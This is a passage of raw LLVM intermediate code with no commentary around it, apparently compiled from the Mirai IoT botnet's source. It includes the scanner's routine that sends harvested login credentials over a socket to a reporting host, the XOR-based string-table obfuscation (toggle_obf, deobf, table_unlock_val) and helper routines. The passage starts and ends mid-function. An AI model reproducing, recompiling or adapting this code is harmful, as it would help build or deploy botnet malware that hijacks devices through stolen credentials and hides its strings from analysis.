  %57 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i32 0, i32 0
  %58 = load i8*, i8** %57, align 8
  %59 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %59, i32 0, i32 4
  %61 = load i8, i8* %60, align 4
  %62 = zext i8 %61 to i64
  %63 = call i64 @send(i32 noundef %55, i8* noundef %58, i64 noundef %62, i32 noundef 16384)
  %64 = load i32, i32* %9, align 4
  %65 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %66 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %65, i32 0, i32 5
  %67 = call i64 @send(i32 noundef %64, i8* noundef %66, i64 noundef 1, i32 noundef 16384)
  %68 = load i32, i32* %9, align 4
  %69 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %70 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %69, i32 0, i32 1
  %71 = load i8*, i8** %70, align 8
  %72 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %73 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %72, i32 0, i32 5
  %74 = load i8, i8* %73, align 1
  %75 = zext i8 %74 to i64
  %76 = call i64 @send(i32 noundef %68, i8* noundef %71, i64 noundef %75, i32 noundef 16384)
  %77 = load i32, i32* %9, align 4
  %78 = call i32 @close(i32 noundef %77)
  call void @exit(i32 noundef 0) #9
  unreachable
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal signext i8 @can_consume(%struct.scanner_connection* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nofree nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #6

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i8* @deobf(i8* noundef %0, i32* noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32* %1, i32** %4, align 8
  %7 = load i8*, i8** %3, align 8
  %8 = call i32 @util_strlen(i8* noundef %7)
  %9 = load i32*, i32** %4, align 8
  store i32 %8, i32* %9, align 4
  %10 = load i32*, i32** %4, align 8
  %11 = load i32, i32* %10, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = call noalias i8* @malloc(i64 noundef %13) #7
  store i8* %14, i8** %6, align 8
  %15 = load i8*, i8** %6, align 8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32*, i32** %4, align 8
  %18 = load i32, i32* %17, align 4
  %19 = add nsw i32 %18, 1
  call void @util_memcpy(i8* noundef %15, i8* noundef %16, i32 noundef %19)
  store i32 0, i32* %5, align 4
  br label %20

20:                                               ; preds = %58, %2
  %21 = load i32, i32* %5, align 4
  %22 = load i32*, i32** %4, align 8
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %21, %23
  br i1 %24, label %25, label %61

25:                                               ; preds = %20
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %5, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = xor i32 %31, 222
  %33 = trunc i32 %32 to i8
  store i8 %33, i8* %29, align 1
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %5, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  %38 = load i8, i8* %37, align 1
  %39 = sext i8 %38 to i32
  %40 = xor i32 %39, 222
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %37, align 1
  %42 = load i8*, i8** %6, align 8
  %43 = load i32, i32* %5, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = xor i32 %47, 251
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %45, align 1
  %50 = load i8*, i8** %6, align 8
  %51 = load i32, i32* %5, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 175
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  br label %58

58:                                               ; preds = %25
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %5, align 4
  br label %20, !llvm.loop !58

61:                                               ; preds = %20
  %62 = load i8*, i8** %6, align 8
  ret i8* %62
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_unlock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @toggle_obf(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

34:                                               ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

83:                                               ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27, !llvm.loop !59

86:                                               ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_lock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @table_retrieve_val(i32 noundef %0, i32* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

17:                                               ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strlen(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

4:                                                ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

10:                                               ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4, !llvm.loop !60

13:                                               ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_memcpy(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %9 = load i8*, i8** %4, align 8
  store i8* %9, i8** %7, align 8
  %10 = load i8*, i8** %5, align 8
  store i8* %10, i8** %8, align 8
  br label %11

11:                                               ; preds = %15, %3
  %12 = load i32, i32* %6, align 4
  %13 = add nsw i32 %12, -1
  store i32 %13, i32* %6, align 4
  %14 = icmp ne i32 %12, 0
  br i1 %14, label %15, label %21

15:                                               ; preds = %11
  %16 = load i8*, i8** %8, align 8
  %17 = getelementptr inbounds i8, i8* %16, i32 1
  store i8* %17, i8** %8, align 8
  %18 = load i8, i8* %16, align 1
  %19 = load i8*, i8** %7, align 8
  %20 = getelementptr inbounds i8, i8* %19, i32 1
  store i8* %20, i8** %7, align 8
  store i8 %18, i8* %19, align 1
  br label %11, !llvm.loop !61

21:                                               ; preds = %11
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @util_zero(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load i8*, i8** %3, align 8
  store i8* %6, i8** %5, align 8
  br label %7

7:                                                ; preds = %11, %2
  %8 = load i32, i32* %4, align 4
  %9 = add nsw i32 %8, -1
  store i32 %9, i32* %4, align 4
  %10 = icmp ne i32 %8, 0
  br i1 %10, label %11, label %14

11:                                               ; preds = %7
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %5, align 8
  store i8 0, i8* %12, align 1
  br label %7, !llvm.loop !62

14:                                               ; preds = %7
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_atoi(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i32 0, i32* %8, align 4
  br label %11

11:                                               ; preds = %16, %2
  %12 = load i8*, i8** %3, align 8
  %13 = getelementptr inbounds i8, i8* %12, i32 1
  store i8* %13, i8** %3, align 8
  %14 = load i8, i8* %12, align 1
  %15 = sext i8 %14 to i32
  store i32 %15, i32* %6, align 4
  br label %16

16:                                               ; preds = %11
  %17 = load i32, i32* %6, align 4
  %18 = trunc i32 %17 to i8
  %19 = call i32 @util_isspace(i8 noundef signext %18)
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %11, label %21, !llvm.loop !63

21:                                               ; preds = %16
  %22 = load i32, i32* %6, align 4
  %23 = icmp eq i32 %22, 45
  br i1 %23, label %24, label %29

24:                                               ; preds = %21
  store i32 1, i32* %8, align 4
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  %27 = load i8, i8* %25, align 1
  %28 = sext i8 %27 to i32
  store i32 %28, i32* %6, align 4
  br label %38

29:                                               ; preds = %21
  %30 = load i32, i32* %6, align 4
  %31 = icmp eq i32 %30, 43
  br i1 %31, label %32, label %37

32:                                               ; preds = %29
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %3, align 8
  %35 = load i8, i8* %33, align 1
  %36 = sext i8 %35 to i32
  store i32 %36, i32* %6, align 4
  br label %37

37:                                               ; preds = %32, %29
  br label %38

38:                                               ; preds = %37, %24
  %39 = load i32, i32* %8, align 4
  %40 = icmp ne i32 %39, 0
  %41 = zext i1 %40 to i64
  %42 = select i1 %40, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %42, i64* %7, align 8
  %43 = load i64, i64* %7, align 8
  %44 = load i32, i32* %4, align 4
  %45 = sext i32 %44 to i64
  %46 = urem i64 %43, %45
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %10, align 4
  %48 = load i32, i32* %4, align 4
  %49 = sext i32 %48 to i64
  %50 = load i64, i64* %7, align 8
  %51 = udiv i64 %50, %49
  store i64 %51, i64* %7, align 8
  store i64 0, i64* %5, align 8
  store i32 0, i32* %9, align 4
  br label %52

52:                                               ; preds = %107, %38
  %53 = load i32, i32* %6, align 4
  %54 = trunc i32 %53 to i8
  %55 = call i32 @util_isdigit(i8 noundef signext %54)
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %60

57:                                               ; preds = %52
  %58 = load i32, i32* %6, align 4
  %59 = sub nsw i32 %58, 48
  store i32 %59, i32* %6, align 4
  br label %76

60:                                               ; preds = %52
  %61 = load i32, i32* %6, align 4
  %62 = trunc i32 %61 to i8
  %63 = call i32 @util_isalpha(i8 noundef signext %62)
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %65, label %74

65:                                               ; preds = %60
  %66 = load i32, i32* %6, align 4
  %67 = trunc i32 %66 to i8
  %68 = call i32 @util_isupper(i8 noundef signext %67)
  %69 = icmp ne i32 %68, 0
  %70 = zext i1 %69 to i64
  %71 = select i1 %69, i32 55, i32 87
  %72 = load i32, i32* %6, align 4
  %73 = sub nsw i32 %72, %71
  store i32 %73, i32* %6, align 4
  br label %75

74:                                               ; preds = %60
  br label %112

75:                                               ; preds = %65
  br label %76

76:                                               ; preds = %75, %57
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = icmp sge i32 %77, %78
  br i1 %79, label %80, label %81

80:                                               ; preds = %76
  br label %112

81:                                               ; preds = %76
  %82 = load i32, i32* %9, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %96, label %84

84:                                               ; preds = %81
  %85 = load i64, i64* %5, align 8
  %86 = load i64, i64* %7, align 8
  %87 = icmp ugt i64 %85, %86
  br i1 %87, label %96, label %88

88:                                               ; preds = %84
  %89 = load i64, i64* %5, align 8
  %90 = load i64, i64* %7, align 8
  %91 = icmp eq i64 %89, %90
  br i1 %91, label %92, label %97

92:                                               ; preds = %88
  %93 = load i32, i32* %6, align 4
  %94 = load i32, i32* %10, align 4
  %95 = icmp sgt i32 %93, %94
  br i1 %95, label %96, label %97

96:                                               ; preds = %92, %84, %81
  store i32 -1, i32* %9, align 4
  br label %106

97:                                               ; preds = %92, %88
  store i32 1, i32* %9, align 4
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* %5, align 8
  %101 = mul i64 %100, %99
  store i64 %101, i64* %5, align 8
  %102 = load i32, i32* %6, align 4
  %103 = sext i32 %102 to i64
  %104 = load i64, i64* %5, align 8
  %105 = add i64 %104, %103
  store i64 %105, i64* %5, align 8
  br label %106

106:                                              ; preds = %97, %96
  br label %107

107:                                              ; preds = %106
  %108 = load i8*, i8** %3, align 8
  %109 = getelementptr inbounds i8, i8* %108, i32 1
  store i8* %109, i8** %3, align 8
  %110 = load i8, i8* %108, align 1
  %111 = sext i8 %110 to i32
  store i32 %111, i32* %6, align 4
  br label %52

112:                                              ; preds = %80, %74
  %113 = load i32, i32* %9, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %120

115:                                              ; preds = %112
  %116 = load i32, i32* %8, align 4
  %117 = icmp ne i32 %116, 0
  %118 = zext i1 %117 to i64
  %119 = select i1 %117, i64 -9223372036854775808, i64 9223372036854775807
  store i64 %119, i64* %5, align 8
  br label %127

120:                                              ; preds = %112
  %121 = load i32, i32* %8, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %126

123:                                              ; preds = %120
  %124 = load i64, i64* %5, align 8
  %125 = sub i64 0, %124
  store i64 %125, i64* %5, align 8
  br label %126

126:                                              ; preds = %123, %120
  br label %127

127:                                              ; preds = %126, %115
  %128 = load i64, i64* %5, align 8
  %129 = trunc i64 %128 to i32
  ret i32 %129
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isspace(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp eq i32 %4, 32
  br i1 %5, label %18, label %6

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp eq i32 %8, 9
  br i1 %9, label %18, label %10

10:                                               ; preds = %6
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp eq i32 %12, 10
  br i1 %13, label %18, label %14

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp eq i32 %16, 10
  br label %18

18:                                               ; preds = %14, %10, %6, %1
  %19 = phi i1 [ true, %10 ], [ true, %6 ], [ true, %1 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  ret i32 %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isdigit(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 48
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 57
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isalpha(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br i1 %9, label %20, label %10

10:                                               ; preds = %6, %1
  %11 = load i8, i8* %2, align 1
  %12 = sext i8 %11 to i32
  %13 = icmp sge i32 %12, 97
  br i1 %13, label %14, label %18

14:                                               ; preds = %10
  %15 = load i8, i8* %2, align 1
  %16 = sext i8 %15 to i32
  %17 = icmp sle i32 %16, 122
  br label %18

18:                                               ; preds = %14, %10
  %19 = phi i1 [ false, %10 ], [ %17, %14 ]
  br label %20

20:                                               ; preds = %18, %6
  %21 = phi i1 [ true, %6 ], [ %19, %18 ]
  %22 = zext i1 %21 to i32
  ret i32 %22
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @util_isupper(i8 noundef signext %0) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = sext i8 %3 to i32
  %5 = icmp sge i32 %4, 65
  br i1 %5, label %6, label %10

6:                                                ; preds = %1
  %7 = load i8, i8* %2, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp sle i32 %8, 90
  br label %10

10:                                               ; preds = %6, %1
  %11 = phi i1 [ false, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_memsearch(i8* noundef %0, i32 noundef %1, i8* noundef %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

15:                                               ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %50

16:                                               ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

17:                                               ; preds = %46, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %49

21:                                               ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

35:                                               ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

40:                                               ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %50

43:                                               ; preds = %35
  br label %45

44:                                               ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

45:                                               ; preds = %44, %43
  br label %46

46:                                               ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %17, !llvm.loop !64

49:                                               ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %50

50:                                               ; preds = %49, %40, %15
  %51 = load i32, i32* %5, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_stristr(i8* noundef %0, i32 noundef %1, i8* noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* noundef %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

16:                                               ; preds = %82, %3
  %17 = load i32, i32* %6, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %6, align 4
  %19 = icmp sgt i32 %17, 0
  br i1 %19, label %20, label %83

20:                                               ; preds = %16
  %21 = load i8*, i8** %8, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %8, align 8
  %23 = load i8, i8* %21, align 1
  store i8 %23, i8* %11, align 1
  %24 = load i8*, i8** %7, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  store i8 %28, i8* %12, align 1
  %29 = load i8, i8* %11, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp sge i32 %30, 65
  br i1 %31, label %32, label %40

32:                                               ; preds = %20
  %33 = load i8, i8* %11, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp sle i32 %34, 90
  br i1 %35, label %36, label %40

36:                                               ; preds = %32
  %37 = load i8, i8* %11, align 1
  %38 = sext i8 %37 to i32
  %39 = or i32 %38, 96
  br label %43

40:                                               ; preds = %32, %20
  %41 = load i8, i8* %11, align 1
  %42 = sext i8 %41 to i32
  br label %43

43:                                               ; preds = %40, %36
  %44 = phi i32 [ %39, %36 ], [ %42, %40 ]
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %11, align 1
  %46 = load i8, i8* %12, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp sge i32 %47, 65
  br i1 %48, label %49, label %57

49:                                               ; preds = %43
